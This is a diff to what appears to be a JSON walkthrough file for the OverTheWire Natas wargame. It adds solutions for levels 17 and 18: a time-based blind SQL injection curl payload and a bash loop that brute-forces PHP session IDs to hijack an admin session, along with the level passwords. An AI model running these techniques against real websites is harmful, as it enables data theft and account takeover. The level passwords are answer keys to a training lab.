@@ -239,6 +239,37 @@
     "<pre></pre>  (empty = prefix correct)"
    ],
    "pw": "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx"
+  },
+  {
+   "lvl": 17,
+   "user": "natas17",
+   "cmds": [
+    [
+     "# the page prints nothing at all \u2014 the only signal left is time",
+     "# IF(condition, SLEEP(2), 0) makes true answers take ~2s longer:",
+     "curl -s -u natas17:PASS -d 'username=natas18\" AND IF(ASCII(SUBSTRING(password,1,1)) > 100, SLEEP(2), 0)#' http://natas17.natas.labs.overthewire.org/index.php -w '%{time_total}'",
+     "# binary-search each character's ASCII code, confirm equality twice, repeat x32"
+    ]
+   ],
+   "out": [
+    "(fast reply = false, ~2s reply = true)"
+   ],
+   "pw": "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op"
+  },
+  {
+   "lvl": 18,
+   "user": "natas18",
+   "cmds": [
+    [
+     "# source: $maxid = 640 \u2014 session ids are rand(1, 640), and an admin is already logged in somewhere",
+     "for i in $(seq 1 640); do curl -s -u natas18:PASS -b \"PHPSESSID=$i\" http://natas18.natas.labs.overthewire.org/ | grep -q 'You are an admin' && echo \"admin session: $i\" && break; done",
+     "# id 119 was the admin's"
+    ]
+   ],
+   "out": [
+    "You are an admin. The credentials for the next level are: Username: natas19"
+   ],
+   "pw": "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT"
   }
  ],
  "goals": {
@@ -258,6 +289,8 @@
   "13": "The upload now checks the file type with exif_imagetype \u2014 so make the PHP look like a GIF.",
   "14": "A login form builds its SQL query with your username inside it.",
   "15": "The form only says whether a user exists \u2014 a blind SQL injection oracle. Brute-force the password through it.",
-  "16": "The dictionary search filters shell metacharacters but not $() command substitution \u2014 turn it into a yes/no oracle and extract the password character by character."
+  "16": "The dictionary search filters shell metacharacters but not $() command substitution \u2014 turn it into a yes/no oracle and extract the password character by character.",
+  "17": "Same injectable user check as before, but every line of output is commented out \u2014 the only remaining channel is response time.",
+  "18": "Admin login is disabled, but sessions are numbered with rand(1, 640) \u2014 try every session id until you find the admin's live session."
  }
 }
